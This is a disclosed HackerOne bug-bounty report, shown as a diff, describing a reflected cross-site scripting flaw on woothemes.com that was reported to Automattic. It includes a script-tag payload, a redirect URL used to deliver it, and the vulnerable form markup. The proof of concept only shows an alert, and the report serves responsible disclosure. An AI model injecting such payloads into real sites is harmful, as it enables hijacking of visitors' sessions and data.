@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/111365
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/valievkarim
+ReportedTo:Automattic(automattic)
+BountyAmount:75.0
+Severity:
+State:Closed
+DateOfDisclosure:19.02.2016 10:20:43
+
+Summary:
+
+This XSS vulnerability can be used against IE browsers.
+There is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1), or take an old browser without XSS filter (IE7). 
+Bypassing an XSS filter in IE will not be covered in this report.
+
+Tested with IE11 with XSS filter disabled and with IE7.
+The redirect is used to bypass query string encoding.
+
+1) Visit http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+2) It redirects to http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>
+3) the alert is shown on www.woothemes.com
+
+The vulnerable URL:
+http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>
+
+The vulnerability occurs because the 'action' attribute is not properly filtered at the page:
+
+    <form class="search" id="productSearchForm" action="/product-category/woocommerce-extensions/?23946\"><script>alert(1)</script>0a7f2=1">
+
+Screenshot is attached.
